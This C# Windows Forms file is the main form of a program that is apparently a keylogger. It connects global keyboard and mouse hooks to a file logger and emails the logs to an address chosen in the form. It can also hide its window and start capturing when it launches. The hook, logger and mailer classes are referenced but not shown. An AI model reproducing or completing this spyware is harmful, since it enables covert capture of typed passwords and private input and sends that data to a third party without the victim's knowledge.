using System;
using System.Windows.Forms;

namespace GlobalHooks
{
    public partial class Form1 : Form
    {
        private Settings settings;
        private Logger logger;
        private Hooks hooks;
        private MailSender mailSender;

        public Form1()
        {
            InitializeComponent();

            settings = new Settings();
            logger = new Logger(@"C:\Andrey\VS2017\GlobalHooks\files", settings.MaxLogFileSize);
            hooks = new Hooks();
            mailSender = new MailSender(settings.EMail);

            SetSettings();

            hooks.Visable += Hooks_Visable;
            hooks.KeyBordHook += logger.AddLineFromKeyBordFile;
            hooks.MauseHook += logger.AddLineFromMouseFiel;

            logger.MessegeReady += mailSender.SendMessage;

            if (settings.AutoStart)
                hooks.Start();
        }

        private void SetSettings()
        {
            this.workMode.SelectedIndex = settings.AutoStart ? 0 : 1;
            this.eMail.Text = settings.EMail;
            this.sizeOfFile.Text = settings.MaxLogFileSize.ToString();
            enableButton.Text = settings.AutoStart ? "Turn Off" : "Turn On";
        }

        private void saveButton_Click(object sender, EventArgs e)
        {
            settings.EMail = eMail.Text;
            settings.MaxLogFileSize = int.Parse(sizeOfFile.Text);
            settings.AutoStart = workMode.SelectedIndex == 0;

            if (!settings.SaveSettings())
            {
                MessageBox.Show("Error", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                logger.MaxFileSize = settings.MaxLogFileSize;
                mailSender.DestinationAddress = settings.EMail;
                MessageBox.Show("Settings saved", "Message", MessageBoxButtons.OK);

            }
        }

        private void Hooks_Visable()
        {
            this.Visible = !this.Visible;
        }

        private void enableButton_Click(object sender, EventArgs e)
        {
            if (hooks.IsStarted)
            {
                hooks.Stop();
                enableButton.Text = "Turn On";
            }
            else
            {
                hooks.Start();
                enableButton.Text = "Turn Off";
            }
        }
    }
}